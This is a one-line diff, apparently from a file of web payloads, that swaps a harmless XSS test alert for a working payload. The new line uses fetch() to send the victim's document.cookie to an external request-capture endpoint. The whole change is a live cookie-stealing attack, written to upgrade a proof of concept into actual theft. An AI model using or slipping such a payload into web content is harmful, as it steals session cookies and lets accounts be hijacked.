@@ -1,1 +1,1 @@
-<script>alert(1)</script>
+ fetch("https://antholam.free.beeceptor.com?c="+document.cookie, { mode: 'no-cors'});
